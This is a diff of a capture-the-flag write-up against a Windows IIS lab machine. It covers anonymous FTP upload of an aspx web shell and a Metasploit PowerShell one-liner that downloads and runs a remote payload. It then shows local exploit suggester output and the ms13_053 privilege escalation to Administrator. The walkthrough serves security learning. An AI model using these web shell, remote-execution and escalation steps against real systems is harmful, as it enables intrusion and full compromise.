@@ -26,7 +26,6 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Jul 21 04:30:06 2017 -- 1 IP address (1 host up) scanned in 35.83 seconds
-
 ```
 
 ftp-anon: Anonymous FTP login allowed - can be used to upload the web shell \(aspx\)
@@ -37,7 +36,7 @@ We can see here that it uses the Microsoft-IIS/7.5 which means the web server is
 
 Aspx web shell used:
 
-https://github.com/unbaiat/maliciouspieceofcodethatcanbeuploadedtoasitetogainaccesstofilesstoredonthatsite/blob/master/aspxshell.aspx
+[https://github.com/unbaiat/maliciouspieceofcodethatcanbeuploadedtoasitetogainaccesstofilesstoredonthatsite/blob/master/aspxshell.aspx](https://github.com/unbaiat/maliciouspieceofcodethatcanbeuploadedtoasitetogainaccesstofilesstoredonthatsite/blob/master/aspxshell.aspx)
 
 After uploading the web shell, I accessed the web shell on the web browser.
 
@@ -139,7 +138,6 @@ Since I have a web shell or backdoor installed, I can now execute some commands.
     [*] Run the following command on the target machine:
     powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://192.168.8.1:8080/2HUTvO3SZKKZ');
 
-
 I copied and pasted the powershell command to the web shell then poof we got a shell.
 
 ```
@@ -161,9 +159,32 @@ Matching Modules
    post/multi/recon/local_exploit_suggester                   normal  Multi Recon Local Exploit Suggester
 
 
-msf exploit(web_delivery) > 
-
+msf exploit(web_delivery) >
 ```
 
+These are the available exploits found on the vulnerable machine.
 
+```
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 37 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+```
+
+I used the schlamperei to gain administrator access on the vulnerable machine.
+
+```
+msf > use exploit/windows/local/ms13_053_schlamperei
+```
+
+And then I got an Administrator access on the machine. :\)
 
